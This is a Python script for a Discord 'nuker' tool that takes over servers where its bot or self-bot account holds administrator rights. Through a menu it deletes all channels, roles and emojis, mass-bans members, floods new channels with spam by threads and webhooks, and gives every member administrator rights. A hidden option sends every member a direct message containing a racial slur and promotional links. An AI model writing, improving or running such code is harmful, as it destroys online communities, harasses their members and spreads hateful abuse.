from datetime import timedelta
import time
import random
import sys
import os
import string
import threading
import asyncio
from concurrent.futures import ThreadPoolExecutor
from config import *

try:
    import requests
    import discord
    from discord.ext import commands
    from colorama import Fore, Style, Back
except:
    print("couldn't import all required packages, installing packages...")
    mods = ["requests", "discord", "colorama"]
    for x in mods:
        os.system("pip install " + x)
    print("\npackages have been installed!")
    import requests
    import discord
    from discord.ext import commands
    from colorama import Fore, Style, Back

epicness = f'''
{Fore.RED}░█▀▀▀ ░█─── ░█▀▀▀█ ░█▀▀█ ░█▀▀█ ─█▀▀█   {Fore.BLUE}░█▄─░█ ░█─░█ ░█─▄▀ ░█▀▀▀ ░█▀▀█ 
{Fore.RED}░█▀▀▀ ░█─── ░█──░█ ░█▄▄█ ░█▄▄█ ░█▄▄█   {Fore.BLUE}░█░█░█ ░█─░█ ░█▀▄─ ░█▀▀▀ ░█▄▄▀ 
{Fore.RED}░█─── ░█▄▄█ ░█▄▄▄█ ░█─── ░█─── ░█─░█   {Fore.BLUE}░█──▀█ ─▀▄▄▀ ░█─░█ ░█▄▄▄ ░█─░█ 
''' + Fore.RESET

print(epicness)

clear = lambda: os.system("cls" if os.name == "nt" else "clear")

perms = discord.Permissions(manage_emojis=True,manage_channels=True,ban_members=True,manage_webhooks=True,manage_roles=True,manage_guild=True,administrator=True).value

headers = {'authorization': "Bot " + token}
me = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                  headers=headers)
if me.status_code == 200:
    bot = commands.Bot(command_prefix='?', intents=discord.Intents.all(), status=discord.Status.invisible)
    headers = {'authorization': "Bot " + token}
    me = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                      headers=headers).json()
    bt = True
    inv = f"https://discord.com/oauth2/authorize?client_id={me['id']}&scope=bot&permissions={perms}"
else:
    bot = commands.Bot(command_prefix='?',
                       intents=discord.Intents.all(),
                       self_bot=True)
    headers = {'authorization': token}
    me = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                      headers=headers)
    if me.status_code != 200:
        print(Fore.RED + "Invalid bot/user token.")
        exit()
    else:
        me = requests.get('https://canary.discordapp.com/api/v6/users/@me',
                          headers=headers).json()
    bt = False
    inv = "No invite"


class floppa:
    __version__ = "1.0.0"
    __author__ = "DaredeviL"


print(f'''
Token: {Fore.YELLOW}{token}{Fore.RESET}
username: {Fore.CYAN}{me['username']}#{me['discriminator']}{Fore.RESET}
invite URL: {Fore.BLUE}{inv}{Fore.RESET}

Version {Fore.MAGENTA}{floppa.__version__}{Fore.RESET}, made by {Fore.YELLOW}{floppa.__author__}{Fore.RESET}.
''')

input("\npress enter to start this nuker\n")

print("starting discord.py bot...")


def main():
    try:
        bot.run(token, bot=bt)
    except Exception as e:
        if "improper token has" in str(e).lower():
            print(f"{Fore.RED}an improper bot token has been passed.")
        elif "our rate limits freq" in str(e).lower():
            print(
                f"{Fore.RED}You are being rate limited, please try again later."
            )
        elif "intents" in str(e).lower():
            print(f"{Fore.RED} Enable all intents.")


def randomString(chars):
    return f"{''.join(random.choices(string.ascii_letters + string.digits, k=chars))}"


def createhook(channel):
    json = {'name': 'Wizzed'}
    r = requests.post(
        f'https://discord.com/api/v8/channels/{channel}/webhooks',
        headers=headers,
        json=json)
    if r.status_code == 200:
        webhook = f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
        print(f'{Fore.GREEN} [+] Webhook created{Fore.RESET}')
    else:
        webhook = "aaa"
        print(f'{Fore.RED} [-] couldn\'t create webhook {Fore.RESET}')
    return webhook


def sendhook(webhook):
    if webhook != 'aaa':
        while True:
            json = {
                'username': random.choice(webhook_names),
                'content': spam_msg,
                'avatar_url': random.choice(webhook_avatars)
            }
            r = requests.post(webhook, json=json)
            if r.status_code == 204:
                print(f'{Fore.YELLOW}Spam message sent{Fore.RESET}')
            else:
                print(f'{Fore.RED}Couldn\'t send message{Fore.RESET}')


def spammer(channel):
    while True:
        json = {'content': spam_msg}
        requests.post(
            f"https://discord.com/api/v8/channels/{channel}/messages",
            headers=headers,
            json=json)
        print(f"{Fore.YELLOW}Spam message sent{Fore.RESET}")


def dchannels(cid):
    while True:
        r = requests.delete(f"https://discord.com/api/v8/channels/{cid}",
                            headers=headers)
        if r.status_code == 200:
            print(
                f"{Fore.LIGHTRED_EX}[--] Channel deleted(#{r.json()['name']}){Fore.RESET}"
            )
        else:
            print(f"{Fore.RED}[-] Couldn't delete channel{Fore.RESET}")
        if 'retry_after' not in r.text:
            break

def droles(guild, rid):
  while True:
    r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{rid}", headers=headers)
    if r.status_code == 200 or r.status_code == 204:
      print(f"{Fore.RED}role deleted{Fore.YELLOW}[{rid}]{Fore.RESET}")
    else:
      print(f"{Fore.RED}[-] couldnt delete role{Fore.RESET}")
    if 'retry_after' not in r.text:
      break

def demojis(guild, emoji):
  while True:
    r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/emojis/{emoji}", headers=headers)
    if r.status_code == 204 or r.status_code == 200:
      print(f"{Fore.LIGHTRED_EX}[--] emoji deleted({emoji}){Fore.RESET}")
    else:
      print(f"{Fore.RED}[-] couldnt delete emoji{Fore.RESET}")
    if "retry_after" not in r.text:
      break

def sroles(guild):
  json = {'name': random.choice(rcnames), 'type': 0, 'color':random.randint(111111, 999999)}
  r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
  if r.status_code == 201 or r.status_code == 200:
    print(f"{Fore.GREEN}[+] role created{Fore.RESET}")
  else:
    print(f"{Fore.RED}[-] couldnt create role{Fore.RESET}")

def massb(guild, user):
  if str(user) == your_id:
    pass
  else:
    while True:
      r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{user}", headers=headers)
      if r.status_code == 200 or r.status_code == 204:
        print(f"{Fore.LIGHTRED_EX}[-=]member banned{Fore.YELLOW}[{user}]{Fore.RESET}")
      else:
        print(f"{Fore.RED}[-=]member banned{Fore.YELLOW}[{user}]{Fore.RESET}")
      if 'retry_after' not in r.text:
        break

def schannels(guild):
    json = {'name': random.choice(scnames), 'type': 0}
    r = requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",
                      headers=headers,
                      json=json)
    if r.status_code == 201:
        print(f"{Fore.GREEN}[+] Channel created{Fore.RESET}")
    if webhook_spammer:
        try:
            webhook = createhook(r.json()['id'])
            threading.Thread(target=sendhook(webhook, )).start()
        except KeyError:
            pass
    else:
        try:
            threading.Thread(target=spammer, args=(r.json()['id'], )).start()
        except KeyError:
            pass

def slb(guild):
  while True:
    r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{user}", headers=headers)
    if r.status_code == 200 or r.status_code == 204:
      print(f"{Fore.LIGHTRED_EX}[-=]member banned{Fore.YELLOW}[{user}]{Fore.RESET}")
    else:
      print(f"{Fore.RED}[-=]member banned{Fore.YELLOW}[{user}]{Fore.RESET}")
    if 'retry_after' not in r.text:
      break

def wizz(guild):
    for x in channels:
      threading.Thread(target=dchannels, args=(x, )).start()
    for x in roles:
      threading.Thread(target=droles, args=(guild, x,)).start()
    for x in range(scamount):
      threading.Thread(target=schannels, args=(guild, )).start()
    for x in range(rcamount):
      threading.Thread(target=sroles, args=(guild,)).start()

@bot.event
async def on_ready():
  while True:
    while True:
        clear()
        print(epicness + "\n\n")
        guilds = '\n'.join([
            f"[{bot.guilds.index(x)+1}] {x.name} - {len(x.members)} members"
            for x in bot.guilds if "administrator" in ', '.join([str(p[0]).title() for p in x.me.guild_permissions if p[1]]).lower()
        ])
        guild = input(guilds + "\n>")
        try:
            guild = bot.guilds[int(guild) - 1]
            break
        except:
            pass
    if bt is False:
      channels = [x.id for x in guild.channels]
      roles = [x.id for x in guild.roles]
      #you can't fetch members while using a user account
      members = []
    else:
      channels = [x.id for x in guild.channels]
      roles = [x.id for x in guild.roles]
      members = [x.id for x in guild.members]
    clear()
    for x in guild.channels:
        try:
            i = await x.create_invite()
            break
        except:
            pass
            i = "couldn't create invite"
    invite = i
    print(f'''
{epicness}

{Fore.RESET}
{Back.BLUE}-----{Fore.WHITE}Server info{Fore.RESET}-----{Back.RESET}

invite: {invite}

Server: {Fore.BLUE}{guild.name}{Fore.RESET}
MemberCount: {Fore.GREEN}{len(guild.members)}{Fore.RESET}
Channels: {Fore.CYAN}{len(guild.channels)}{Fore.RESET}
Roles: {Fore.RED}{len(guild.roles)}{Fore.RESET}
Owner: {Fore.YELLOW}{guild.owner}{Fore.RESET}

{Back.WHITE}-----{Fore.BLACK}Nuke Options{Fore.RESET}-----{Back.RESET}

[1] {Fore.RED}Wizz{Fore.RESET}
[2] {Fore.YELLOW}Delete all channels{Fore.RESET}
[3] {Fore.GREEN}\033[96mSpam channels{Fore.RESET}
[4] {Fore.MAGENTA}banall{Fore.RESET}
[5] {Fore.CYAN}delete all roles{Fore.RESET}
[6] {Fore.GREEN}{Style.DIM}spam roles{Style.RESET_ALL}{Fore.RESET}
[7] {Style.DIM}admin{Style.RESET_ALL}
[8] {Fore.LIGHTBLUE_EX}delete all emojis{Fore.RESET}
[9] {Fore.LIGHTGREEN_EX}spam emojis{Fore.RESET}
[10] change server name and icon

{Back.WHITE}-----{Fore.BLACK}Other Options{Fore.RESET}-----{Back.RESET}

[11] {Fore.GREEN}View ban list{Fore.RESET}
[12] {Fore.YELLOW}Leave the server{Fore.RESET}
[13] choose another server''' + Fore.RESET)
    while True:
      opt = input('>')
      if opt == '1':
        try:
          perm = discord.Permissions(manage_emojis=True,manage_channels=True,ban_members=True,manage_webhooks=True,manage_roles=True,manage_guild=True,administrator=True)
          perm.update()
          await guild.default_role.edit(permissions=perm)
        except:
          try:
            perm = discord.Permissions(manage_emojis=True,manage_channels=True,ban_members=True,manage_webhooks=True,manage_roles=True,manage_guild=True)
            perm.update()
            await guild.default_role.edit(permissions=perm)
          except:
            pass
        try:
          await guild.edit(name=guild_name, icon=requests.get(guild_icon).content)
        except:
          pass
        wizz(guild.id)
      if opt == '2':
        for x in channels:
          threading.Thread(target=dchannels, args=(x, )).start()
      if opt == '3':
        for x in range(scamount):
          threading.Thread(target=schannels, args=(guild.id, )).start()
      if opt == '4':
        for x in members:
          threading.Thread(target=massb, args=(guild.id, x,)).start()
      if opt == '5':
        for x in roles:
          threading.Thread(target=droles, args=(guild.id, x,)).start()
      if opt == '6':
        for x in range(rcamount):
          threading.Thread(target=sroles, args=(guild.id,)).start()
      if opt == '7':
        try:
          perm = discord.Permissions(manage_emojis=True,manage_channels=True,ban_members=True,manage_webhooks=True,manage_roles=True,manage_guild=True,administrator=True)
          perm.update()
          await guild.default_role.edit(permissions=perm)
        except:
          perm = discord.Permissions(manage_emojis=True,manage_channels=True,ban_members=True,manage_webhooks=True,manage_roles=True,manage_guild=True)
          perm.update()
          await guild.default_role.edit(permissions=perm)
        print("Everyone role has been given the administrator permission!")
      if opt == '8':
        #for x in emojis:
          # threading.Thread(target=demojis, args=(guild.id,x,)).start() i get ratelimited instantly   
        for x in guild.emojis:
          try:
            await x.delete()
            print(f"{Fore.LIGHTRED_EX}[--] emoji deleted({x.name}){Fore.RESET}")
          except:
            print(f"{Fore.RED}[-] couldnt delete emoji{Fore.RESET}")
            pass
      if opt == '9':
        for x in range(esamount):
          try:
            await guild.create_custom_emoji(name="DaredeviL_runs_you", image=requests.get(emojiurl).content)
            print(f"{Fore.GREEN}[+] Emoji created{Fore.RESET}")
          except Exception as e:
            print(f"{Fore.RED}[-] couldnt create emoji{Fore.RESET}")
            pass
      if opt == "10":
        try:
          await guild.edit(name=guild_name, icon=requests.get(guild_icon).content)
          print(f"{Fore.GREEN}Guild edited!{Fore.RESET}")
        except:
          print(f"{Fore.RED}couldnt edit guild{Fore.RESET}")
      if opt == "11":
        try:
          bans = await guild.bans()
          print('\n'.join([f"{x.user}, reason: {x.reason}" for x in bans]))
        except:
          print(Fore.RED+"I couldnt access the ban list.")
      if opt == "12":
        i = input("Are you sure you want to leave this server? this action cannot be undone. answer with y/n\n>")
        if i == 'y':
          await guild.leave()
          break
        else:
          pass
      if opt == "13":
        break
      if opt == "md":
        for x in guild.members:
          try:
            await x.send("niggered by nut and DaredeviL !  https://youtube.com/channel/UCA2-rL4Zkyd9amv571f-bDA https://youtube.com/channel/UCIGomE0ob75e4mtVoEE2sKg")
            print("sent ouldnt send msg to "+str(x))
          except:
            print("couldnt send msg to "+str(x))

main() 
